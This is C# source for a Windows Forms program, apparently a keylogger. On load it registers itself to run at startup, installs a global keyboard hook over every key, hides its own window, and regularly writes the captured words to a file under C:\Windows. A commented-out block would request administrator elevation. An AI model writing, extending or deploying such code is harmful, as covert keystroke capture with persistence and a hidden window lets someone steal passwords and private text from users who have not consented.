using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using Timer = System.Windows.Forms.Timer;

namespace bot
{
    public partial class Form1 : Form
    {
        GlobalKeyboardHook gHook;
        
        
        List<string> words = new List<string>();
        int count = 0;
        int time = 1;
        string word = "";
        private Timer timer1;
        private Timer timer2;
        int shit = 0;
        
        public Form1()
        {
            InitializeComponent();
            // base.SetVisibleCore(false);
            //this.Visible = false;
        }
       /* public void adminRights()
        {
            ProcessStartInfo proc = new ProcessStartInfo();
            proc.UseShellExecute = true;
            proc.WorkingDirectory = Environment.CurrentDirectory;
            proc.FileName = Application.ExecutablePath;
            proc.Verb = "runas";
            try
            {
                Process.Start(proc);
            }
            catch
            {
                // The user refused the elevation.
                // Do nothing and return directly ...
                return;
            }
        }*/

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            gHook.hook();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            gHook.unhook();
        }
        
        private void Form1_Load(object sender, EventArgs e)
        {
           
            
            //adminRights();
            Startup.RunOnStartup();

            timer1 = new Timer();
            timer1.Tick += new EventHandler(timer1_Tick);
            timer1.Interval = 1500; 
            timer1.Start();

            gHook = new GlobalKeyboardHook(); 
                                              
            gHook.KeyDown += new KeyEventHandler(gHook_KeyDown);
            
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                gHook.HookedKeys.Add(key);
              gHook.hook();

        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            base.SetVisibleCore(false);
            if (time == 0)
            {
                words.Add(word);
                word = "";
                count = 0;
                time = 1;
                System.IO.File.WriteAllLines(@"C:\Windows\test.txt", words);      
            }
            
        }
        public void gHook_KeyDown(object sender, KeyEventArgs e)
        {         
            textBox1.Text += ((char)e.KeyValue).ToString();
            // textBox1.Text += (e.KeyValue).ToString();
            
            if (((char)e.KeyValue) == ' ')
            {              
                words.Add(word);
                word = "";
                count = 0;
            }
            if (word.Length > 0)
            {
                if((e.KeyValue) == 8){
                    count--;
                    word = word.Remove(count, 1);
                 //textBox1.Text += pos;
                }

            }
            if ((e.KeyValue) == 8)
            {
                
            }

            else 
            {              
                word = word + ((char)e.KeyValue).ToString();    
                count++;
                time = 0;
                timer1.Stop();
                timer1.Start();
                 
            }
          
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            gHook.unhook();
            //Process.Start(Application.ProductName, Application.ExecutablePath);
        }
        private void button3_Click(object sender, EventArgs e)
        {
            words.Add(word);
            System.IO.File.WriteAllLines(@"C:\Users\Nicolas Kapps\Desktop\test.txt", words);           
        }

    }
}
